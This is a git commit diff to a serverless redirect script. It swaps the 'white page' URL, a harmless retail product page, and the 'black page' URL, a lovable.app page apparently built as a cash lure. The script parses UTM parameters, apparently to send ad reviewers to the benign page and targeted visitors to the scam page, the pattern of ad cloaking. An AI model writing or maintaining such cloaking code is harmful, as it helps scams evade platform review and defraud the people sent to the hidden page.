877c77e7e90ac84065dc6777ff216c3b35bdf773
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-11-17 21:21:46 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://coverstorys.co.nz/products/stylish-phone-case-with-polar-bear-design-unique-gift-animal-lover-accessory-winter-vibe-trending-tech-accessories-tough-cases";
-    const blackPageURL = "https://luvcshap.lovable.app/?";
+    const whitePageURL = "https://www.centrepointstores.com/sa/en/Toys/Outdoor/Scooters/BABYSHOP-Disney-Frozen-Print-Scooter/p/167637543";
+    const blackPageURL = "https://lovefrecashhhh.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
